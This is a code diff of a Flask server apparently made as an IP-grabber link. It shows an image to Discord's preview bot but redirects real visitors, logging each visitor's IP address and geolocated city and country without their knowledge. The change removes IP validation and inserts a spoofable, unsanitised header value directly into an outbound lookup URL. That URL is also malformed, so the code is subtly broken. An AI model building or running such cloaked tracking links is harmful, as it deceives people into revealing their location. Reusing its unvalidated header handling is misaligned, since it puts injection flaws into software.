@@ -1,22 +1,14 @@
 from flask import Flask, request, send_file, redirect
 import requests
-import re
 
 app = Flask(__name__)
 
-def clean_ip(ip_string):
-    if not ip_string:
-        return None
-    match = re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', ip_string)
-    return match.group(0) if match else None
-
 def get_location_data(ip_address):
-    valid_ip = clean_ip(ip_address)
-    if not valid_ip or valid_ip == '127.0.0.1':
+    if not ip_address or ip_address in ['127.0.0.1', 'Unknown IP']:
         return "Unknown Country", "Unknown City"
         
     try:
-        url = f"http://ip-api.com{valid_ip}"
+        url = f"http://ip-api.com{ip_address}"
         response = requests.get(url, timeout=3)
         if response.status_code == 200:
             data = response.json()
@@ -36,16 +28,21 @@ def conditional_serve():
     if "UptimeRobot" in user_agent:
         return "OK", 200
 
-    ip_header = request.headers.get('X-Forwarded-For', request.remote_addr)
+    client_ip = request.headers.get('True-Client-IP')
+    if not client_ip:
+        ip_header = request.headers.get('X-Forwarded-For', request.remote_addr)
+        if ip_header:
+            client_ip = ip_header.split(',')[0].strip()
+        else:
+            client_ip = 'Unknown IP'
     
-    country, city = get_location_data(ip_header)
-    clean_display_ip = clean_ip(ip_header) or "Unknown IP"
+    country, city = get_location_data(client_ip)
     
     if "Discordbot" in user_agent:
-        print(f"[LOG] Discord Bot detected | IP: {clean_display_ip} | Location: {city}, {country} | Serving preview.")
+        print(f"[LOG] Discord Bot detected | IP: {client_ip} | Location: {city}, {country} | Serving preview.")
         return send_file('actual_image.png', mimetype='image/png')
     else:
-        print(f"[LOG] User browser detected | IP: {clean_display_ip} | Location: {city}, {country} | Redirecting.")
+        print(f"[LOG] User browser detected | IP: {client_ip} | Location: {city}, {country} | Redirecting.")
         return redirect("https://wikipedia.org")
 
 if __name__ == '__main__':
